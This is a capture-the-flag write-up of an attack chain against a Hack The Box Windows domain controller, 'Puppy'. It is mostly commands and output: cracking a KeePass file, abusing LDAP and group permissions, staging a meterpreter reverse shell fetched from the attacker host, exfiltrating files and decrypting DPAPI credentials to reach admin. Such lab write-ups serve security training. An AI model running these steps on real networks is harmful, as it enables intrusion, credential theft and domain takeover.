# Target
| Category          | Details                                                                                                                                    |
|-------------------|--------------------------------------------------------------------------------------------------------------------------------------------|
| 📝 **Name**       | [Puppy](https://app.hackthebox.com/machines/Puppy)                                                                                         |  
| 🏷 **Type**       | HTB Machine                                                                                                                                |
| 🖥 **OS**         | Windows                                                                                                                                    |
| 🎯 **Difficulty** | Medium                                                                                                                                     |
| 📁 **Tags**       | ActiveDirectory, Bloodhound, KeePass, LDAP, DPAPI                                                                                          |
| 💡 **Info**       | As is common in real life pentests, you will start the Puppy box with credentials for the following account: levi.james / KingofAkron2025! |

# Scan
```
PORT      STATE SERVICE       VERSION
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-18 02:41:24Z)
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2049/tcp  open  mountd        1-3 (RPC #100005)
3260/tcp  open  iscsi?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49691/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-05-18T02:43:12
|_  start_date: N/A
|_clock-skew: 7h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 335.61 seconds
```

# Attack path
1. [Enumerate Active Directory with BloodHound]()
2. [Escalate to `ant.edwards` user with discovered credentials]()
3. [Escalate to (disabled) `adam.silver` with user to gain foothold]()
4. [Escalate to `steph.cooper` user with discovered credentials]()
5. [Escalate to `steph.cooper_adm` (`Administrator`) user with discovered credentials]()

### Enumerate Active Directory with BloodHound

#### Add the domain managed by the target’s domain controller to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB Puppy]
└─$ echo "$TARGET puppy.htb" | sudo tee -a /etc/hosts
10.129.232.75 puppy.htb
```

#### Collect data
```
┌──(magicrc㉿perun)-[~/attack/HTB Puppy]
└─$ ~/Tools/BloodHound.py/bloodhound.py -d puppy.htb -c All -ns $TARGET -u levi.james -p KingofAkron2025!
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: puppy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.puppy.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 10 users
INFO: Found 56 groups
INFO: Found 3 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.PUPPY.HTB
INFO: Done in 00M 06S
```

#### Run BloodHound and import data
```
┌──(magicrc㉿perun)-[~/attack/HTB Puppy]
└─$ curl -s -L https://ghst.ly/getbhce > docker-compose.yml && \
sudo docker compose up
```

### Escalate to `ant.edwards` user with discovered credentials

#### Identify `levi.james` to `developers` escalation path
![Escalate from `levi.james` to `developers`](images/levi.james_developers.png)

#### Add `levi.james` to `developers` group
```
┌──(magicrc㉿perun)-[~/attack/HTB Puppy]
└─$ net rpc group addmem developers levi.james -U puppy.htb/levi.james%KingofAkron2025! -S puppy.htb
```

#### Exfiltrate `recovery.kdbx` KeePass database file from `DEV` share
```
┌──(magicrc㉿perun)-[~/attack/HTB Puppy]
└─$ smbclient -U levi.james%KingofAkron2025! \\\\puppy.htb\\DEV -c "get recovery.kdbx"
getting file \recovery.kdbx of size 2677 as recovery.kdbx (25.9 KiloBytes/sec) (average 25.9 KiloBytes/sec)```
```

#### Crack `recovery.kdbx` master password
```
┌──(magicrc㉿perun)-[~/attack/HTB Puppy]
└─$ git clone -q https://github.com/r3nt0n/keepass4brute.git && \
./keepass4brute/keepass4brute.sh recovery.kdbx /usr/share/wordlists/rockyou.txt
keepass4brute 1.3 by r3nt0n
https://github.com/r3nt0n/keepass4brute

[+] Words tested: 38/14344393 - Attempts per minute: 71 - Estimated time remaining: 20 weeks, 0 days
[+] Current attempt: liverpool

[*] Password found: liverpool
```

#### Retrieve `ant.edwards` password from `recovery.kdbx` using cracked master password
```
┌──(magicrc㉿perun)-[~/attack/HTB Puppy]
└─$ echo liverpool | keepassxc-cli show recovery.kdbx "ANTONY C. EDWARDS" --attributes Password
Enter password to unlock recovery.kdbx: 
Antman2025!
```

### Escalate to (disabled) `adam.silver` with user to gain foothold

#### Identify `ant.edwards` to `adam.silver` escalation path
![Escalate from `ant.edwards` to `adam.silver`](images/ant.edwards_adam.silver.png)

#### Obtain `userAccountControl` of disabled `adam.silver` user
```
┌──(magicrc㉿perun)-[~/attack/HTB Puppy]
└─$ ldapsearch -x -LLL -H ldap://puppy.htb -D ant.edwards@puppy.htb -wAntman2025! -b "dc=puppy,dc=htb" "(sAMAccountName=adam.silver)" userAccountControl
dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
userAccountControl: 66050
```

#### Prepare LDAP modification file for enabling `adam.silver` user
User disabled flag is equal to 0x02
```
┌──(magicrc㉿perun)-[~/attack/HTB Puppy]
└─$ cat <<EOF> enable_adam.silver.ldif
dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
changetype: modify
replace: userAccountControl
userAccountControl: 66048
EOF
```

#### Enable `adam.silver` user
```
┌──(magicrc㉿perun)-[~/attack/HTB Puppy]
└─$ ldapmodify -x -D ant.edwards@puppy.htb -w Antman2025! -H ldap://puppy.htb -f enable_adam.silver.ldif
modifying entry "CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB"
```

#### Change password for `adam.silver` user
```
┌──(magicrc㉿perun)-[~/attack/HTB Puppy]
└─$ net rpc password adam.silver P@sssword123 -U puppy.htb/ant.edwards%Antman2025! -S puppy.htb
```

#### Gain foothold with forged credentials
```
┌──(magicrc㉿perun)-[~/attack/HTB Puppy]
└─$ evil-winrm -i puppy.htb -u adam.silver -p P@sssword123
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\adam.silver\Documents> whoami
puppy\adam.silver
```

### Escalate to `steph.cooper` user with discovered credentials

#### Host reverse `meterpreter` shell
Metasploit will be used for easier data exfiltration.
```
┌──(magicrc㉿perun)-[~/attack/HTB Puppy]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1) \
    LPORT=4444 \
    -f exe \
    -o shell.exe && \
python3 -m http.server
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

#### Start `msfconsole`
```
┌──(magicrc㉿perun)-[~/attack/HTB Puppy]
└─$ msfconsole -q -x "use exploit/multi/handler; set LHOST tun0; set LPORT 4444; set payload windows/x64/meterpreter/reverse_tcp; run"
[*] Using configured payload generic/shell_reverse_tcp
LHOST => tun0
LPORT => 4444
payload => windows/x64/meterpreter/reverse_tcp
[*] Started reverse TCP handler on 10.10.14.161:4444 
```

#### Download and run reverse shell
```
*Evil-WinRM* PS C:\Users\adam.silver\Documents> wget http://10.10.14.161:8000/shell.exe -out shell.exe
*Evil-WinRM* PS C:\Users\adam.silver\Documents> ./shell.exe
```

#### Exfiltrate `site-backup-2024-12-30.zip` file
```
meterpreter > download C:\\Backups\\site-backup-2024-12-30.zip
[*] Downloading: C:\Backups\site-backup-2024-12-30.zip -> /home/magicrc/attack/HTB Puppy/site-backup-2024-12-30.zip
[*] Downloaded 1.00 MiB of 4.42 MiB (22.6%): C:\Backups\site-backup-2024-12-30.zip -> /home/magicrc/attack/HTB Puppy/site-backup-2024-12-30.zip
[*] Downloaded 2.00 MiB of 4.42 MiB (45.2%): C:\Backups\site-backup-2024-12-30.zip -> /home/magicrc/attack/HTB Puppy/site-backup-2024-12-30.zip
[*] Downloaded 3.00 MiB of 4.42 MiB (67.8%): C:\Backups\site-backup-2024-12-30.zip -> /home/magicrc/attack/HTB Puppy/site-backup-2024-12-30.zip
[*] Downloaded 4.00 MiB of 4.42 MiB (90.4%): C:\Backups\site-backup-2024-12-30.zip -> /home/magicrc/attack/HTB Puppy/site-backup-2024-12-30.zip
[*] Downloaded 4.42 MiB of 4.42 MiB (100.0%): C:\Backups\site-backup-2024-12-30.zip -> /home/magicrc/attack/HTB Puppy/site-backup-2024-12-30.zip
[*] Completed  : C:\Backups\site-backup-2024-12-30.zip -> /home/magicrc/attack/HTB Puppy/site-backup-2024-12-30.zip
```

#### Look for credentials in exfiltrated backup
```
┌──(magicrc㉿perun)-[~/attack/HTB Puppy]
└─$ unzip site-backup-2024-12-30.zip -d site-backup-2024-12-30 > /dev/null && \
cat site-backup-2024-12-30/puppy/nms-auth-config.xml.bak
<?xml version="1.0" encoding="UTF-8"?>
<ldap-config>
    <server>
        <host>DC.PUPPY.HTB</host>
        <port>389</port>
        <base-dn>dc=PUPPY,dc=HTB</base-dn>
        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
        <bind-password>ChefSteph2025!</bind-password>
    </server>
    <user-attributes>
        <attribute name="username" ldap-attribute="uid" />
        <attribute name="firstName" ldap-attribute="givenName" />
        <attribute name="lastName" ldap-attribute="sn" />
        <attribute name="email" ldap-attribute="mail" />
    </user-attributes>
    <group-attributes>
        <attribute name="groupName" ldap-attribute="cn" />
        <attribute name="groupMember" ldap-attribute="member" />
    </group-attributes>
    <search-filter>
        <filter>(&(objectClass=person)(uid=%s))</filter>
    </search-filter>
</ldap-config>
```

#### Gain access with WinRM as `steph.cooper` user 
```
┌──(magicrc㉿perun)-[~/attack/HTB Puppy]
└─$ evil-winrm -i puppy.htb -u steph.cooper -p ChefSteph2025!
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\steph.cooper\Documents> whoami
puppy\steph.cooper
```

### Escalate to `steph.cooper_adm` (`Administrator`) user with discovered credentials

#### Upload `PrivescCheck.ps1`
```
meterpreter > upload ~/Tools/PrivescCheck/PrivescCheck.ps1
[*] Uploading  : /home/magicrc/Tools/PrivescCheck/PrivescCheck.ps1 -> PrivescCheck.ps1
[*] Uploaded 205.55 KiB of 205.55 KiB (100.0%): /home/magicrc/Tools/PrivescCheck/PrivescCheck.ps1 -> PrivescCheck.ps1
[*] Completed  : /home/magicrc/Tools/PrivescCheck/PrivescCheck.ps1 -> PrivescCheck.ps1
```

#### Identify Local Privilege Escalation vulnerabilities with `PrivescCheck`
```
*Evil-WinRM* PS C:\Users\steph.cooper\Documents> . .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT
<SNIP>
┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ CATEGORY ┃ TA0006 - Credential Access                        ┃
┃ NAME     ┃ Credential files                                  ┃
┃ TYPE     ┃ Extended                                          ┃
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ Get information about the current user's CREDENTIAL files.   ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

Type     : Credentials
FullPath : C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D

Type     : Credentials
FullPath : C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9

Type     : Protect
FullPath : C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407
<SNIP>
```

#### Exfiltrate DP credentials and master key of `steph.cooper` user
```
meterpreter > download C:\\Users\\steph.cooper\\AppData\\Local\\Microsoft\\Credentials\\DFBE70A7E5CC19A398EBF1B96859CE5D
[*] Downloading: C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D -> /home/magicrc/attack/HTB Puppy/DFBE70A7E5CC19A398EBF1B96859CE5D
[*] Downloaded 10.81 KiB of 10.81 KiB (100.0%): C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D -> /home/magicrc/attack/HTB Puppy/DFBE70A7E5CC19A398EBF1B96859CE5D
[*] Completed  : C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D -> /home/magicrc/attack/HTB Puppy/DFBE70A7E5CC19A398EBF1B96859CE5D

meterpreter > download C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Credentials\\C8D69EBE9A43E9DEBF6B5FBD48B521B9
[*] Downloading: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9 -> /home/magicrc/attack/HTB Puppy/C8D69EBE9A43E9DEBF6B5FBD48B521B9
[*] Downloaded 414.00 B of 414.00 B (100.0%): C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9 -> /home/magicrc/attack/HTB Puppy/C8D69EBE9A43E9DEBF6B5FBD48B521B9
[*] Completed  : C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9 -> /home/magicrc/attack/HTB Puppy/C8D69EBE9A43E9DEBF6B5FBD48B521B9

meterpreter > download C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-1487982659-1829050783-2281216199-1107\\556a2412-1275-4ccf-b721-e6a0b4f90407
[*] Downloading: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407 -> /home/magicrc/attack/HTB Puppy/556a2412-1275-4ccf-b721-e6a0b4f90407
[*] Downloaded 740.00 B of 740.00 B (100.0%): C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407 -> /home/magicrc/attack/HTB Puppy/556a2412-1275-4ccf-b721-e6a0b4f90407
[*] Completed  : C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407 -> /home/magicrc/attack/HTB Puppy/556a2412-1275-4ccf-b721-e6a0b4f90407
```

#### Decrypt exfiltrated master key
```
┌──(magicrc㉿perun)-[~/attack/HTB Puppy]
└─$ impacket-dpapi masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -t 'puppy.htb/steph.cooper:ChefSteph2025!@puppy.htb'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
Flags       :        0 (0)
Policy      : 4ccf1275 (1288639093)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key using rpc call
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

#### Use decrypted master key to decrypt `C8D69EBE9A43E9DEBF6B5FBD48B521B9` credentials
```
┌──(magicrc㉿perun)-[~/attack/HTB Puppy]
└─$ impacket-dpapi credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PUPPY.HTB
Description : 
Unknown     : 
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!
```

#### Gain access with WinRM as `steph.cooper_adm` user 
```
┌──(magicrc㉿perun)-[~/attack/HTB Puppy]
└─$ evil-winrm -i puppy.htb -u steph.cooper_adm -p FivethChipOnItsWay2025!
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\steph.cooper_adm\Documents> whoami
puppy\steph.cooper_adm
*Evil-WinRM* PS C:\Users\steph.cooper_adm\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ===============================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```
